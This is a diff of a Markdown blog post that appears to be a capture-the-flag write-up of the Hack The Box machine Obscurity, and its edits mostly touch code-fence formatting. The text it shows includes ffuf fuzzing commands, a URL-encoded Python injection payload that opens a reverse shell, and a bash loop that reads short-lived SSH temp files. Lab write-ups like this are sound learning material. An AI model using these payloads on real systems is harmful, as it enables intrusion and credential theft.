@@ -32,7 +32,7 @@ Python's sort of my thing. Me being my nefarious self, I **really** want to see 
 
 After the whole debacle with looking for interesting files in Teacher, I've been looking into ways to automate that process. I decided the first thing to do would be to find that development folder. I also didn't have a lot of word lists to hand, so I was just going to use the default American English spelling list, comme ca:
 
-```shell script
+```
 ffuf -c -w /usr/share/dict/american-english -u http://10.10.10.168:8080/FUZZ
 ```
 
@@ -44,7 +44,7 @@ This was enough of a red herring that I spent maybe an hour trying to reconstruc
 
 This made the problem with the fuzzer extremely clear, and it was easy enough to pop a new fuzz into my jobs queue:
 
-```shell script
+```
 ffuf -c -w /usr/share/dict/american-english -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
 ```
 
@@ -78,13 +78,14 @@ This was what I used:
 ```
 
 In order to exploit this, you'd want to get a netcat "catcher" running, then send the URL-Encoded version through the browser (or curl):
+
 ```
 http://10.10.10.168:8080/%27%3Bimport%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%27127.0.0.1%27%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27%2Fbin%2Fsh%27%2C%27-i%27%5D%29%3Bfoo%3D%27
 ```
 
 The page will load and hang forever, but as long as you were listening appropriately on your end you now have your reverse shell.
 
-```shell script
+```
 $ whoami
 www-data
 ```
@@ -166,7 +167,7 @@ BetterSSH briefly writes a file with a random name into a directory at /tmp/SSH 
 
 Of course, it also deletes that file really quickly. While there were probably more elegant solutions for the problem, I simply wrote a terrible bash script to set running in one terminal:
 
-```shell script
+```
 while true; do for i in /tmp/SSH/*; do cat $i; done; done
 ```
 
@@ -200,6 +201,7 @@ SuperSecureServer is nominally logging output from the call we exploit using tha
 #### SuperSecureServer.py is broken on purpose.
 
 We could patch the server script this way:
+
 ```
 def serveDoc(self, path, docRoot):
     path = urllib.parse.unquote(path)
